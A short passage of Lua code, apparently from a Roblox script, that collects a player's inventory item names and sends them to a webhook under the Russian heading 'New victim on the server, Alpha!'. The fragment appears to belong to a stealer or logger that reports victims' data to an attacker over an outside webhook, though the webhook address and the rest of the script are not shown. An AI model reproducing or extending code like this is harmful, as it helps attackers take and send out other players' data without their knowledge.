                table.insert(items, item.Name)
            end
            if #items > 0 then
                inventoryText = table.concat(items, ", ")
            end
        end
    end
    
    table.insert(fields, {name = "Инвентарь", value = inventoryText})
    
    sendToWebhook("Новая жертва на сервере, Alpha!", fields)
